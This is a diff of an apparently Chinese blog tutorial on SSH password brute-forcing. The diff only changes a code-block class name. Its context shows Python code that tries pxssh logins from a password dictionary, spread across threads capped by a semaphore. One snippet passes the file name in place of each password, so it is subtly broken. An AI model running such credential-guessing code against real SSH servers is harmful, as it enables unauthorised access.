@@ -133,7 +133,7 @@ pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好
 
 <p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>
 
-<pre><code class="language-Python">def connect(host,user,password):
+<pre><code class="language-python">def connect(host,user,password):
     try:
         session = pxssh.pxssh()
         session.login(host,user,password)
@@ -148,7 +148,7 @@ pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好
 
 <p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>
 
-<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
+<pre><code class="language-python">password_file = open(password,&#39;r&#39;)
 for line in password_file:
         thread = threading.Thread(target=connect,args=(host,user,password))
         thread.start()
@@ -156,7 +156,7 @@ for line in password_file:
 
 <p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>
 
-<pre><code class="language-Python">maxConnections = 5
+<pre><code class="language-python">maxConnections = 5
 connection_lock = threading.BoundedSemaphore(maxConnections)
 password_file = open(password,&#39;r&#39;)
 for line in password_file:
@@ -176,7 +176,7 @@ for line in password_file:
 
 <h4 id="toc_3">完整代码</h4>
 
-<pre><code class="language-Python">from pexpect import pxssh
+<pre><code class="language-python">from pexpect import pxssh
 import threading
 import optparse
 import time
